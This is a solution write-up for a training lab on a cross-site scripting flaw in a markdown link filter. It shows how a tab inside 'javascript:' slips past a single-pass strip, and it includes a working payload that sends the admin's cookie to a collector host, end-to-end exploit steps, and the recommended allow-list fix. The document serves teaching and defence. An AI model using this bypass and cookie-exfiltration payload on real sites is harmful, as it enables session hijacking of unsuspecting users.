# Solution — Markdown Renderer javascript: URI Filter Bypass

## Vulnerability class

**CWE-79 · OWASP A03:2021 – Injection** — Cross-Site Scripting in an
**attribute (href) context**, reached by a `javascript:` URI that a single-pass
substring filter fails to neutralise.

## The sink

WikiLite renders exactly one markdown construct, the link, and drops the URL into
an `href`:

```python
_LINK = re.compile(r"\[([^\]]+)\]\((.+)\)", re.S)

def _sanitise_href(url: str) -> str:
    url = re.sub(r"javascript:", "", url, flags=re.IGNORECASE)  # single pass, the flaw
    return url.replace('"', "&quot;")                            # only stops a " breakout

# ... render:
'<a class="wiki-link" href="%s">%s</a>' % (href, text)
```

The link text is HTML-escaped, and a literal `"` in the URL is entity-encoded so
you cannot break out of the attribute and add your own. The _only_ thing standing
between you and a `javascript:` href is that one `re.sub`. An `href` does not need
angle brackets or an event handler to run script — `href="javascript:…"` executes
its script when the link is **activated** (clicked). So the entire lab is: get a
`javascript:` scheme into that href.

## Why the filter is the wrong tool

`re.sub(r"javascript:", "", url, flags=re.I)` is a **blocklist strip**, and it has
two independent problems, either of which defeats it:

1. **It is single-pass and non-recursive.** `re.sub` scans left to right once and
   does not re-examine the result. So `javasjavascript:cript:` → the middle
   `javascript:` is removed, the halves rejoin into `javascript:`, and the output
   is a live scheme the filter never re-checks. (Classic "strip once" defeat.)
2. **It matches a literal substring, but the browser normalises the scheme.** The
   URL parser strips **tab (U+0009), newline (U+000A) and carriage-return
   (U+000D)** from a URL before it interprets the scheme. So
   `java&#9;script:` / `java<TAB>script:` is _not_ the substring `javascript:`
   (the filter leaves it alone) but _is_ `javascript:` to the browser once it
   removes the tab. The scheme is decoded on navigation, after the filter has run.

This lab's intended solution uses **(2)** — a literal tab in the scheme.

## The bypass

Post this markdown page (the byte between `java` and `script` is a literal TAB):

```
[click me](java	script:void(new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)))
```

Walk it through the pipeline:

- **Regex capture.** `\[([^\]]+)\]\((.+)\)` is greedy, so group 2 captures
  everything from the first `(` to the **last** `)` — i.e. the whole
  `java<TAB>script:void(…cookie))` URL, parentheses and all. (That greedy capture
  is why the `void(...)`/`encodeURIComponent(...)` parens survive intact.)
- **The strip is a no-op.** `re.sub(r"javascript:", …)` looks for the exact
  substring `javascript:`. Our string is `java\tscript:` — the tab is in the way,
  so nothing matches and the URL passes through unchanged.
- **The `"`-replace is a no-op too.** The payload uses only single quotes, so
  there is no `"` to encode; the href is emitted verbatim.
- **Rendered HTML:**
  ```html
  <a
    class="wiki-link"
    href="java&#9;script:void(new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie))"
    >click me</a
  >
  ```
  (the tab shown here as `&#9;` — it is a raw 0x09 byte in the response).
- **On click**, the browser strips the tab from the URL, reads the scheme as
  `javascript:`, and runs the expression in the page's origin.

`void(...)` matters: a `javascript:` URI whose expression returns a non-`undefined`
value replaces the document with that value. `new Image().src = '…'` evaluates to
the assigned string, which _would_ navigate the page to a text document — the
beacon still fires, but wrapping in `void(...)` returns `undefined` so the page
stays put and the exploit is clean.

## Why it needs the click (the delivery model)

Unlike the earlier XSS labs, where an `<img onerror>` fires on page **load**, a
`javascript:` href only runs on **activation**. So the sink is _interaction-gated_:
the admin bot must click the link. This lab configures the shared verifier bot
with `XSSBOT_CLICK_SELECTOR=a.wiki-link`, so after loading `/admin/review` it
clicks the primary link — modelling a human reviewer opening a submitted link.
The lesson: a payload that needs a click is still exploitable whenever the victim
workflow _involves_ a click (reviewing, previewing, "open link"), which wiki/CMS
moderation invariably does.

## Why you can't just read the cookie or the page

```
GET /admin/review              → 403 (no admin cookie)
GET /internal/bot-login?k=…    → 403 from the public side (backend subnet + BOT_KEY)
```

You never load `/admin/review` and never obtain the admin cookie. You don't need
to — the admin's browser has it, and you make the admin's browser read it for you
with `document.cookie` (the cookie is deliberately **not** `HttpOnly`).

## End-to-end

```
# 1. Post the tab-smuggled javascript: link (TAB between java and script):
POST /pages   {"body":"[click me](java\tscript:void(new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)))"}

# 2. Wait ~2s. The admin bot loads /admin/review and clicks a.wiki-link;
#    the tab-normalised javascript: URI runs and beacons document.cookie.

# 3. Read what the collector captured (app-side proxy):
GET /oob/received            # find /report?c=session%3D<32 hex>

# 4. Submit the session value:
POST /solve   {"c":"<32 hex>"}      →  FLAG{…}
```

`tests/exploit.py` automates this: assert `/admin/review` is `403` for us → post
the page → poll `/oob/received` → parse the 32-hex session → `/solve`. It also
documents the **negative control**: the same payload with a plain `javascript:`
(no tab) is stripped to `void(...)`, a relative href that does nothing — proving
the tab is load-bearing.

## Why the containment holds

- The collector and admin bot live on a `backend` network with `internal: true` —
  **no route off the host**. The stolen cookie reaches the in-lab collector but
  never the internet, so the lab ships a real cookie-theft primitive at
  `risk: low`.
- `/internal/bot-login` is firewalled to the backend subnet **and** gated by a
  `BOT_KEY`, so a public visitor cannot mint the admin cookie and skip the XSS.
- `/admin/review` requires the admin session; the click-delivered XSS is the only
  way to run in that session.
- Single gunicorn worker: the page store and admin session live in-process, so the
  bot and the exploit see one consistent state.

## The fix

1. **Allow-list the scheme, after normalisation — the real fix.** Never try to
   _strip_ dangerous schemes. Parse the URL, lower-case and strip control
   characters/whitespace from the scheme, and permit only a known-safe set:

   ```python
   ALLOWED = {"http", "https", "mailto", ""}   # "" = relative URL

   def safe_href(url: str) -> str | None:
       scheme = url.split(":", 1)[0].strip().lower()
       scheme = re.sub(r"[\t\r\n]", "", scheme)      # normalise like the browser does
       if scheme not in ALLOWED:
           return None                                # reject javascript:, data:, vbscript:, …
       return url
   ```

   `java<TAB>script:` normalises to `javascript:`, which is not in the allow-list,
   so the link is dropped. Allow-listing fails **closed**: a scheme you did not
   anticipate is rejected, not passed through.

2. **Contextual attribute encoding is not enough on its own here.** HTML-encoding
   the href stops a `"`-breakout (a _second_, different injection), but a
   `javascript:` URI needs no special characters — it is a perfectly ordinary
   attribute value. Encoding does not neutralise the scheme; only scheme
   validation does.

3. **Defence in depth.** A `Content-Security-Policy` without `unsafe-inline` /
   with a restrictive `script-src` blocks inline `javascript:` execution, and
   marking the cookie `HttpOnly` removes the `document.cookie` read (though, as the
   blind-XSS lab shows, script in the victim origin can still drive authenticated
   requests). The scheme allow-list is the fix that addresses the actual bug.

## Deviation from the catalog stack

The reference scenario is a **Node/Express** wiki that renders user markdown with
**markdown-it** and installs a custom `link_open` rule that strips `javascript:`
from hrefs, served behind **nginx** and reviewed by a **Puppeteer** bot (the
GitLab/Discourse wiki-markdown XSS class, e.g. the CVE-2022-2185 pattern). This
lab **re-platforms it to Flask** with a minimal in-app link renderer that
reproduces the exact flaw — a single-pass `re.sub(r"javascript:", "", href)`. The
taught vulnerability (href-context `javascript:` URI, defeating a substring strip
with a control character in the scheme, delivered on a reviewer's click) is
identical on either stack; markdown-it, Express and nginx are incidental plumbing.
The Playwright verifier stands in for Puppeteer with the same click-delivery
behaviour.
